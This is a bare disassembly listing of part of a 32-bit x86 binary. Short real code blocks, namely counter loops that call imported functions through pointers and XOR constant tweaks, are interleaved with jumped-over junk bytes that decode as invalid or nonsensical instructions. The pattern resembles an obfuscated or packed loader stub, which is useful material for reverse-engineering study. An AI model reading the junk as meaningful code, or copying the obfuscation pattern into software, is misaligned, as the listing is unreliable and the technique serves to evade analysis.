  40b76a:	(bad)  
  40b76c:	popa   
  40b76d:	je     0x40b79d
  40b76f:	inc    ebp
  40b770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b771:	sub    BYTE PTR [edi+0x76076045],dl
  40b777:	lahf   
  40b778:	push   ecx
  40b779:	push   0x50
  40b77b:	dec    DWORD PTR [ebx+0x6e2a3911]
  40b781:	fcomp  QWORD PTR [ecx+0x4e]
  40b784:	push   0xc
  40b786:	bound  ebx,QWORD PTR [ebx+0x7589ae79]
  40b78c:	fsub   DWORD PTR [ecx]
  40b78e:	sbb    eax,0x430532
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x4305c2
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0x5c230697
  40b7b0:	inc    edx
  40b7b1:	jge    0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b81b
  40b7ba:	dec    edi
  40b7bb:	mov    ebp,0x1bb21a5b
  40b7c0:	cli    
  40b7c1:	aad    0x1b
  40b7c3:	jne    0x40b767
  40b7c5:	xor    ebp,esi
  40b7c7:	push   eax
  40b7c8:	mov    bh,0x8c
  40b7ca:	out    dx,al
  40b7cb:	aad    0xdc
  40b7cd:	ficom  DWORD PTR [eax+ebx*4+0x4b8045c4]
  40b7d4:	xchg   esp,eax
  40b7d5:	cwde   
  40b7d6:	jg     0x40b81d
  40b7d8:	cmp    dx,WORD PTR [ebx+0x74f3b5da]
  40b7df:	gs ja  0x40b820
  40b7e2:	popf   
  40b7e3:	(bad)  
  40b7e4:	mov    ds:0x37bd67bf,eax
  40b7e9:	(bad)  
  40b7eb:	xchg   esi,eax
  40b7ec:	pop    ebp
  40b7ed:	cmp    BYTE PTR [ebp-0x3a2178b6],al
  40b7f3:	call   FWORD PTR [ebx+edi*8]
  40b7f6:	dec    ebp
  40b7f7:	sbb    BYTE PTR [ebx-0x6b],cl
  40b7fa:	dec    ebp
  40b7fb:	std    
  40b7fc:	jo     0x40b792
  40b7fe:	fld    st(6)
  40b800:	push   es
  40b801:	adc    eax,0x4344010b
  40b806:	(bad)
  40b809:	mov    cl,0x2
  40b80b:	push   0xd967e858
  40b810:	mov    edx,0xd350c2e9
  40b815:	sbb    al,BYTE PTR [esi+0x6e]
  40b818:	je     0x40b804
  40b81a:	ss scas al,BYTE PTR es:[edi]
  40b81c:	pushw  ss
  40b81e:	sbb    edx,edi
  40b820:	bound  ecx,QWORD PTR [eax]
  40b822:	mov    ah,0xec
  40b824:	jecxz  0x40b7b4
  40b826:	mov    eax,ss
  40b828:	push   edi
  40b829:	jecxz  0x40b852
  40b82b:	add    ebx,esi
  40b82d:	test   dh,0xe2
  40b830:	(bad)
  40b834:	fucompp 
  40b836:	aas    
  40b837:	js     0x40b7e2
  40b839:	(bad)  
  40b83a:	mov    esi,0x889ac6f4
  40b83f:	cmp    ah,BYTE PTR [edx]
  40b841:	pop    ebp
  40b842:	pop    eax
  40b843:	adc    edx,DWORD PTR [ebp-0x2e]
  40b846:	in     al,dx
  40b847:	and    BYTE PTR [edx-0x5f],ch
  40b84a:	fwait
  40b84b:	cli    
  40b84c:	sub    bh,BYTE PTR [ebp-0x7b61a7ca]
  40b852:	cmp    edi,ebx
  40b854:	imul   esi,DWORD PTR [ebp+0x26],0xffffffa8
  40b858:	mov    edx,0x8e07083e
  40b85d:	neg    BYTE PTR [esi]
  40b85f:	xchg   edx,eax
  40b860:	retf   
  40b861:	outs   dx,DWORD PTR ds:[esi]
  40b862:	push   ebx
  40b863:	sbb    eax,0x3f175564
  40b868:	hlt    
  40b869:	sub    al,0x9d
  40b86b:	xor    ch,dl
  40b86d:	ficom  WORD PTR [ecx-0x65aed969]
  40b873:	(bad)  
  40b874:	imul   al
  40b876:	push   ecx
  40b877:	add    dl,BYTE PTR gs:[edi]
  40b87a:	dec    ecx
  40b87b:	(bad)  
  40b87c:	mov    esi,0xc72d3532
  40b881:	xchg   esp,eax
  40b882:	test   eax,0xb15556f3
  40b887:	ins    BYTE PTR es:[edi],dx
  40b888:	adc    al,0xdf
  40b88a:	aam    0x17
  40b88c:	inc    esi
  40b88d:	repnz sub BYTE PTR [ecx+eiz*1+0x5],cl
  40b892:	and    ebp,DWORD PTR [edx+0x21]
  40b895:	clc    
  40b896:	addr16 gs ret 
  40b899:	pop    ss
  40b89a:	mov    eax,0xbe3512f3
  40b89f:	xor    esi,DWORD PTR [edx]
  40b8a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8a2:	mov    dh,0x7d
  40b8a4:	pop    es
  40b8a5:	(bad)  
  40b8a6:	and    dl,bh
  40b8a8:	popa   
  40b8a9:	inc    ebx
  40b8aa:	and    dh,BYTE PTR [edi+0x9a5102]
  40b8b0:	stc    
  40b8b1:	mov    esp,0x33ff09f3
  40b8b6:	enter  0xa655,0xe8
  40b8ba:	icebp  
  40b8bb:	xchg   bl,al
  40b8bd:	fstp   DWORD PTR [eax+esi*8-0x9]
  40b8c1:	stc    
  40b8c2:	std    
  40b8c3:	dec    ebx
  40b8c4:	add    DWORD PTR ds:0xc5393bf0,ecx
  40b8ca:	mov    WORD PTR [ebx-0x3e],ss
  40b8cd:	aas    
  40b8ce:	add    ch,BYTE PTR [esi-0x2c]
  40b8d1:	retf   
  40b8d2:	mov    ds:0x1224ca4b,eax
  40b8d7:	inc    esp
  40b8d8:	leave  
  40b8d9:	sub    ecx,eax
  40b8db:	sbb    bl,al
  40b8dd:	xor    dh,BYTE PTR [ebp+0x38fcab9a]
  40b8e3:	cli    
  40b8e4:	mov    edi,0x24ffe002
  40b8e9:	pop    edi
  40b8ea:	push   ebp
  40b8eb:	xor    ebp,DWORD PTR [edi+0x71]
  40b8ee:	stos   BYTE PTR es:[edi],al
  40b8ef:	adc    BYTE PTR [edx+0x771bdfa8],dl
  40b8f5:	sbb    DWORD PTR [ebx-0x19],eax
  40b8f8:	xor    esi,DWORD PTR [ebp-0x77]
  40b8fb:	jne    0x40b8e9
  40b8fd:	sbb    ecx,DWORD PTR ds:0x4305c6
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430516
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43051e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x430526,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42eea8,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42eeac,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42eea0,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	or     BYTE PTR [ebp+eiz*1-0x50],0x23
  40b964:	ds clc 
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b972
  40b96d:	xor    al,0x5d
  40b96f:	jp     0x40b9de
  40b971:	hlt    
  40b972:	int3   
  40b973:	stc    
  40b974:	mov    ds:0x22007c49,al
  40b979:	fs cmc 
  40b97b:	ins    DWORD PTR es:[edi],dx
  40b97c:	inc    ebx
  40b97d:	(bad)  
  40b97e:	test   DWORD PTR [ecx+0x5],0x9336b631
  40b985:	sub    al,0x25
  40b987:	and    BYTE PTR [esi],cl
  40b989:	js     0x40b9f5
  40b98b:	jg     0x40b975
  40b98d:	data16 sbb BYTE PTR [esi],al
  40b990:	mov    eax,ds:0xee8a43c1
  40b995:	push   cs
  40b996:	scas   al,BYTE PTR es:[edi]
  40b997:	cmp    BYTE PTR [ebp+0x3f],dh
  40b99a:	scas   eax,DWORD PTR es:[edi]
  40b99b:	imul   BYTE PTR [esi+0x2f]
  40b99e:	and    DWORD PTR [ebp-0x20],0x6855aa88
  40b9a5:	fstp   TBYTE PTR [esi]
  40b9a7:	xchg   edx,eax
  40b9a8:	cmovno eax,DWORD PTR [ecx+0x63]
  40b9ac:	pop    es
  40b9ad:	ret    
  40b9ae:	and    eax,DWORD PTR [ecx]
  40b9b0:	jae    0x40b93d
  40b9b2:	loop   0x40b9e4
  40b9b4:	dec    ebp
  40b9b5:	push   ebx
  40b9b6:	in     eax,dx
  40b9b7:	mov    bh,0xf8
  40b9b9:	adc    DWORD PTR [edi],0x475bcefc
  40b9bf:	fidiv  DWORD PTR [ecx+0x1cab7f93]
  40b9c5:	repz loop 0x40b9ea
  40b9c8:	jecxz  0x40b9f3
  40b9ca:	jo     0x40ba31
  40b9cc:	xchg   BYTE PTR [ebp-0x1a],cl
  40b9cf:	dec    eax
  40b9d0:	push   es
  40b9d1:	inc    edx
  40b9d2:	or     edi,DWORD PTR [edx]
  40b9d4:	ret    0xe91f
  40b9d7:	rcr    DWORD PTR [eax],0x22
  40b9da:	retf   
  40b9db:	sti    
  40b9dc:	xchg   ebp,eax
  40b9dd:	pop    ecx
  40b9de:	sbb    eax,0x12a35be1
  40b9e3:	mov    cl,0x5f
  40b9e5:	in     al,0xbb
  40b9e7:	jle    0x40b9cd
  40b9e9:	inc    esi
  40b9ea:	jmp    0xc84aa26e
  40b9ef:	add    al,0xa5
  40b9f1:	fistp  DWORD PTR [edx-0xe089985]
  40b9f7:	inc    esp
  40b9f8:	mul    BYTE PTR [eax]
  40b9fa:	dec    ecx
  40b9fb:	(bad)  
  40b9ff:	sbb    BYTE PTR [ebx+0x4e14c180],ch
  40ba05:	lods   eax,DWORD PTR ds:[esi]
  40ba06:	and    DWORD PTR [esi],edi
  40ba08:	mov    cl,0x4f
  40ba0a:	sti    
  40ba0b:	ja     0x40ba5b
  40ba0d:	cmp    bl,dl
  40ba0f:	(bad)  
  40ba10:	and    ebx,ebx
  40ba12:	fimul  DWORD PTR [esi]
  40ba14:	popa   
  40ba15:	xor    eax,DWORD PTR [eax+0x60df6fb0]
  40ba1b:	mov    ah,0xbd
  40ba1d:	and    dh,BYTE PTR [ecx-0xae0e532]
  40ba23:	mov    dl,0x74
  40ba25:	fisub  DWORD PTR [edi+0x2a]
  40ba28:	jecxz  0x40ba71
  40ba2a:	test   DWORD PTR [ecx-0x4f],0xd541c41f
  40ba31:	retf   0xe2f0
  40ba34:	adc    al,0x95
  40ba36:	(bad)  
  40ba37:	xor    BYTE PTR [ebp+0x606a80ca],dh
  40ba3d:	jno    0x40ba2d
  40ba3f:	inc    eax
  40ba40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba41:	jmp    DWORD PTR [ecx]
  40ba43:	bound  eax,QWORD PTR [eax]
  40ba45:	mov    ds:0xde440513,al
  40ba4a:	push   ecx
  40ba4b:	je     0x40ba8e
  40ba4d:	cwd    
  40ba4f:	addr16 sbb al,0x2d
  40ba52:	inc    esi
  40ba53:	in     eax,dx
  40ba54:	pop    ebp
  40ba55:	adc    BYTE PTR [ebx+0x21e16ec8],cl
  40ba5b:	sbb    DWORD PTR [esi+ecx*2],edx
  40ba5e:	cwde   
  40ba5f:	and    bh,bl
  40ba61:	retf   
  40ba62:	add    al,BYTE PTR [eax+0xe922f6a]
  40ba68:	out    dx,eax
  40ba69:	jnp    0x40ba6c
  40ba6b:	mov    ecx,0xd70a1e73
  40ba70:	std    
  40ba71:	mov    es,ebx
  40ba73:	cmp    eax,0x7cb79d14
  40ba78:	outs   dx,BYTE PTR ds:[esi]
  40ba79:	xchg   ecx,eax
  40ba7a:	mov    dh,0x39
  40ba7d:	(bad)  
  40ba7e:	(bad)  
  40ba7f:	fwait
  40ba80:	jno    0x40ba8e
  40ba82:	sahf   
  40ba83:	xchg   edx,eax
  40ba84:	sbb    DWORD PTR [ebp+0x7a],ecx
  40ba87:	xor    eax,0xe446692c
  40ba8c:	lods   al,BYTE PTR ds:[esi]
  40ba8d:	xor    BYTE PTR [ebx+ebx*8+0x4f],0xa3
  40ba92:	sub    al,0xdb
  40ba94:	adc    ebp,esp
  40ba96:	outs   dx,DWORD PTR ds:[esi]
  40ba97:	call   0x89da4661
  40ba9c:	jge    0x40bae0
  40ba9e:	leave  
  40ba9f:	cmp    DWORD PTR [ebx-0x5c58844b],ebp
  40baa5:	add    edi,esp
  40baa7:	mov    bh,0x9a
  40baa9:	leave  
  40baaa:	cmp    DWORD PTR [edi-0x5f],eax
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42eea0,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430516,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42eea8,0x42ee94
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee9c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee9c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee9c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee9c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ec54
  40bb1b:	cmp    DWORD PTR ds:0x42ee9c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x4305d6
  40bb2e:	xor    DWORD PTR ds:0x430536,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x430532,0x43051a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	lea    eax,[esi]
  40bb58:	(bad)  
  40bb59:	daa    
  40bb5a:	(bad)  
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb42
  40bb63:	inc    esi
  40bb64:	out    dx,eax
  40bb65:	std    
  40bb66:	ds clc 
  40bb68:	lods   al,BYTE PTR ds:[esi]
  40bb69:	push   esi
  40bb6a:	ins    BYTE PTR es:[edi],dx
  40bb6b:	popa   
  40bb6c:	mov    al,ds:0x119189fb
  40bb71:	jo     0x40bbb8
  40bb73:	stos   DWORD PTR es:[edi],eax
  40bb74:	ss jo  0x40bb9a
  40bb77:	and    BYTE PTR ds:[ebx+0x40],bh
  40bb7b:	lods   eax,DWORD PTR ds:[esi]
  40bb7c:	lock xchg ebp,eax
  40bb7e:	scas   eax,DWORD PTR es:[edi]
  40bb7f:	ret    0x17fa
  40bb82:	sbb    DWORD PTR [eax+0x44e89154],ebp
  40bb88:	jb     0x40bbbc
  40bb8a:	and    BYTE PTR [eax+edx*2+0x3430de2d],0xe9
  40bb92:	jecxz  0x40bbe4
  40bb94:	ss xchg ecx,eax
  40bb96:	mov    dh,0xdb
  40bb98:	ja     0x40bbf0
  40bb9a:	jb     0x40bb8a
  40bb9c:	xchg   BYTE PTR [ebp-0x614b75e],cl
  40bba2:	adc    BYTE PTR [esi],ch
  40bba4:	clc    
  40bba5:	in     eax,0xd
  40bba7:	cmp    BYTE PTR [esi-0x3b],dh
  40bbaa:	cmp    eax,0x29c976f
  40bbaf:	shr    DWORD PTR [edx+0x7a],1
  40bbb2:	ds repnz cmp al,0x4a
  40bbb6:	ficom  DWORD PTR [ecx-0x107fcce1]
  40bbbc:	cld    
  40bbbd:	pop    ss
  40bbbe:	mov    dl,0xd8
  40bbc0:	cmp    al,0x22
  40bbc2:	sbb    esi,ebp
  40bbc4:	adc    BYTE PTR [edx+eiz*2+0x398bf71c],0x71
  40bbcc:	or     ah,bl
  40bbce:	mov    edi,0x6fae0261
  40bbd3:	mov    esi,0x20892474
  40bbd8:	fdivr  DWORD PTR [esi+ecx*8-0x43]
  40bbdc:	push   0x0
  40bbde:	sbb    DWORD PTR ds:0x3537f437,esp
  40bbe4:	xchg   ebx,eax
  40bbe5:	lds    ebp,FWORD PTR [eax+0x21bb4fae]
  40bbeb:	pop    esp
  40bbec:	out    dx,eax
  40bbed:	xchg   DWORD PTR [ecx+0x81d20cf],edx
  40bbf3:	loope  0x40bc61
  40bbf5:	ins    DWORD PTR es:[edi],dx
  40bbf6:	sub    DWORD PTR [ecx+0x43],ebp
  40bbf9:	and    al,0x42
  40bbfb:	jl     0x40bc14
  40bbfd:	test   ebx,esi
  40bbff:	sbb    DWORD PTR ds:0x24ecbeaa,eax
  40bc05:	dec    eax
  40bc06:	clc    
  40bc07:	add    edx,DWORD PTR [ebx+eiz*8-0xd65db56]
  40bc0e:	mov    al,ds:0x7ea7e82a
  40bc13:	push   0x26
  40bc15:	mov    cl,0x44
  40bc17:	arpl   bx,si
  40bc19:	aad    0x29
  40bc1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc1c:	int3   
  40bc1d:	imul   ebx,DWORD PTR [ebp-0x7c],0x61b76423
  40bc24:	sbb    ebx,ebx
  40bc26:	fsub   QWORD PTR [edi]
  40bc28:	fbstp  TBYTE PTR [ebx-0x71d956a5]
  40bc2e:	mov    cl,0x26
  40bc30:	loop   0x40bbe7
  40bc32:	cs enter 0xbf69,0x3
  40bc37:	popa   
  40bc38:	cld    
  40bc39:	mov    WORD PTR [ecx+0x20],gs
  40bc3c:	cmp    ecx,edi
  40bc3e:	xchg   edi,eax
  40bc3f:	mov    ebx,0xb7b36572
  40bc44:	in     eax,dx
  40bc45:	xchg   BYTE PTR [edi],ch
  40bc47:	mov    DWORD PTR [edi],0xf8e5329a
  40bc4d:	dec    edx
  40bc4e:	icebp  
  40bc4f:	mov    ?,WORD PTR [ebx-0x71]
  40bc52:	test   al,0x9
  40bc54:	mov    BYTE PTR [ebp+esi*4+0x68],cl
  40bc58:	pop    esp
  40bc59:	mov    ss,WORD PTR [ebx]
  40bc5b:	add    al,0x7c
  40bc5d:	mov    bl,0x6d
  40bc5f:	xchg   edi,eax
  40bc60:	adc    esp,DWORD PTR [ecx+0x79]
  40bc63:	dec    eax
  40bc64:	outs   dx,DWORD PTR ds:[esi]
  40bc65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc66:	cmp    ch,ch
  40bc68:	clc    
  40bc69:	inc    edi
  40bc6a:	aam    0x51
  40bc6c:	adc    eax,ebp
  40bc6e:	cmc    
  40bc6f:	(bad)  
  40bc70:	and    esp,DWORD PTR [ecx+0x4c]
  40bc73:	scas   eax,DWORD PTR es:[edi]
  40bc74:	xchg   edx,eax
  40bc75:	or     esi,DWORD PTR [esi]
  40bc77:	push   ds
  40bc78:	cmc    
  40bc79:	fsub   DWORD PTR [ebp+0x4519079a]
  40bc7f:	jbe    0x40bc18
  40bc81:	adc    dh,ah
  40bc83:	inc    eax
  40bc84:	mov    DWORD PTR [ebx+edx*4],ebx
  40bc87:	jmp    0x40bcb2
  40bc89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc8a:	cld    
  40bc8b:	retf   0xb220
  40bc8e:	sbb    ebp,ecx
  40bc90:	js     0x40bc4b
  40bc92:	add    eax,0x9586787d
  40bc97:	cli    
  40bc98:	or     eax,0xd808f0e5
  40bc9d:	adc    BYTE PTR [eax],cl
  40bc9f:	or     al,0xe3
  40bca1:	mov    esp,0x3bc303d6
  40bca6:	enter  0x5c7,0xd2
  40bcaa:	add    eax,0x373b0043
  40bcaf:	add    BYTE PTR [eax],al
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x4305ce,0x42eeb0
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x43053e,0x4305c6
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x430542,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x430542
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x430542,ecx
  40bcf2:	cmp    DWORD PTR ds:0x430542,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x430542,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x430522
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42eaac
  40bd1f:	cmp    DWORD PTR ds:0x430542,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x430542
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x430542,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e7f2,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430516
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x4305da,0x4305d2
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee90,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x430532,0x19
  40bd88:	cmp    DWORD PTR ds:0x430532,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x430532,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42eab0
  40bdad:	mov    ecx,DWORD PTR ds:0x430532
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x430532,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x4305da
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	aas    
  40bddd:	repnz fbld TBYTE PTR [ecx-0x50]
  40bde1:	cli    
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40bdff
  40bde9:	ins    DWORD PTR es:[edi],dx
  40bdea:	shr    BYTE PTR [ecx],0x41
  40bded:	sub    eax,0xdbb1d402
  40bdf2:	adc    DWORD PTR ds:0xd559e2a,0xfffffff8
  40bdf9:	int3   
  40bdfa:	mov    eax,0x584a3d93
  40bdff:	fdivr  st(6),st
  40be01:	sub    BYTE PTR [edx-0x7890ed13],ah
  40be07:	mov    ds:0x393a91e4,al
  40be0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be0d:	pop    ebx
  40be0e:	cmp    bl,ah
  40be10:	dec    ebp
  40be11:	push   0xffffffc0
  40be13:	jle    0x40be24
  40be15:	iret   
  40be16:	daa    
  40be17:	std    
  40be18:	fist   WORD PTR [eax]
  40be1a:	test   DWORD PTR [edx+0x5d66f4a6],ecx
  40be20:	je     0x40bea0
  40be22:	adc    bh,0x54
  40be25:	pop    edi
  40be26:	xchg   edi,eax
  40be27:	dec    esi
  40be28:	mov    WORD PTR [ecx+0x38],?
  40be2b:	popa   
  40be2c:	lods   eax,DWORD PTR ds:[esi]
  40be2d:	dec    edx
  40be2e:	lock xor esp,DWORD PTR gs:[ebx]
  40be32:	cmp    eax,0x76ad9f28
  40be37:	mov    bh,dh
  40be39:	sti    
  40be3a:	cmp    bl,dl
  40be3c:	repz or al,0xce
  40be3f:	fst    QWORD PTR [eax+eiz*8+0x34e97dad]
  40be46:	mov    ds:0x5a65a5d8,eax
  40be4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be4c:	dec    edi
  40be4d:	xchg   DWORD PTR [edx],edi
  40be4f:	jnp    0x40beb8
  40be51:	cmp    ebp,edx
  40be53:	jb     0x40be4d
  40be55:	test   al,0x94
  40be57:	(bad)  
  40be58:	(bad)  [edi]
  40be5a:	pop    esi
  40be5b:	push   0x6
  40be5d:	sti    
  40be5e:	inc    ebx
  40be5f:	scas   al,BYTE PTR es:[edi]
  40be60:	je     0x40be64
  40be62:	xchg   edi,eax
  40be63:	and    DWORD PTR [edi],esp
  40be65:	lods   eax,DWORD PTR ds:[esi]
  40be66:	enter  0xcdc7,0x22
  40be6a:	jge    0x40be24
  40be6c:	popf   
  40be6d:	clc    
  40be6e:	bound  ebx,QWORD PTR ds:0xc2e12c7b
  40be74:	lods   al,BYTE PTR ds:[esi]
  40be75:	cmp    di,WORD PTR [ecx]
  40be78:	sub    dl,BYTE PTR [edx+0x205261a0]
  40be7e:	sub    BYTE PTR [ebx+0x55],bh
  40be81:	push   eax
  40be82:	mov    dl,0x0
  40be84:	nop
  40be85:	mov    esi,0x8fb82379
  40be8a:	jb     0x40be73
  40be8c:	mul    BYTE PTR [ebx]
  40be8e:	(bad)  
  40be8f:	push   cs
  40be90:	mov    edi,0x42fa32e8
  40be95:	(bad)  
  40be96:	dec    edx
  40be97:	pop    es
  40be98:	int    0xce
  40be9a:	movzx  ecx,BYTE PTR [esi]
  40be9d:	mov    dh,0xb8
  40be9f:	xor    eax,0xb31796d5
  40bea4:	and    ch,bh
  40bea6:	jmp    0xa25e:0x1625ba5c
  40bead:	sahf   
  40beae:	dec    eax
  40beaf:	xor    al,0x5f
  40beb1:	ds fs mov bl,0x4a
  40beb5:	pop    es
  40beb6:	mov    eax,ds:0xd762a0e1
  40bebb:	retf   0xd7f8
  40bebe:	pop    ds
  40bebf:	js     0x40be59
  40bec1:	in     eax,0xfe
  40bec3:	sub    BYTE PTR [eax+0x66],bh
  40bec6:	ret    
  40bec7:	test   bl,cl
  40bec9:	pop    ss
  40beca:	test   al,0x77
  40becc:	shl    ecx,0x48
  40becf:	push   ss
  40bed0:	sbb    al,0x63
  40bed2:	popf   
  40bed3:	out    dx,al
  40bed4:	cmp    BYTE PTR [edx+0x60],0x2a
  40bed8:	push   ecx
  40bed9:	adc    BYTE PTR [esi-0x4a],bh
  40bedc:	pop    ecx
  40bedd:	aad    0x4e
  40bedf:	push   ebp
  40bee0:	mov    esp,0xb3356915
  40bee5:	loope  0x40bf33
  40bee7:	push   esp
  40bee8:	in     al,dx
  40bee9:	pop    ss
  40beea:	in     al,0xfb
  40beec:	sbb    al,0x28
  40beee:	(bad)  
  40beef:	pop    ds
  40bef0:	mov    bh,BYTE PTR [ecx+eiz*4]
  40bef3:	stos   DWORD PTR es:[edi],eax
  40bef4:	pop    esi
  40bef5:	and    dl,0x4c
  40bef8:	addr16 cwde 
  40befa:	or     BYTE PTR ds:0x682a8f53,al
  40bf00:	leave  
  40bf01:	je     0x40be99
  40bf03:	mov    bl,0x7b
  40bf05:	jo     0x40bf0b
  40bf07:	adc    al,0x5e
  40bf09:	sbb    eax,0x12e25da5
  40bf0e:	int    0xca
  40bf10:	mov    al,0x27
  40bf12:	ret    
  40bf13:	mov    edi,0x99d7f1e8
  40bf18:	cmp    al,bh
  40bf1a:	push   ebp
  40bf1b:	jl     0x40bf49
  40bf1d:	cmp    eax,0x4100dd00
  40bf22:	cmp    al,0x7d
  40bf24:	push   0x317481c9
  40bf29:	mov    eax,DWORD PTR [ebp-0x14]
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x430526,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	mov    fs,WORD PTR [ebx+ebx*2+0x41]
  40bf4e:	jno    0x40bf4c
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf53
  40bf57:	das    
  40bf58:	mov    ah,0x90
  40bf5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf5b:	int3   
  40bf5c:	das    
  40bf5d:	cs sbb eax,0x22604be0
  40bf63:	xor    DWORD PTR [esi-0x11],0x7849e0cc
  40bf6a:	mov    dh,0xdc
  40bf6c:	mov    ecx,ebx
  40bf6e:	(bad)  
  40bf6f:	xchg   ecx,eax
  40bf70:	pusha  
  40bf71:	jmp    0x40bf58
  40bf73:	mov    ebp,0x179a9414
  40bf78:	cld    
  40bf79:	sbb    dl,BYTE PTR [ecx-0x53c1b91b]
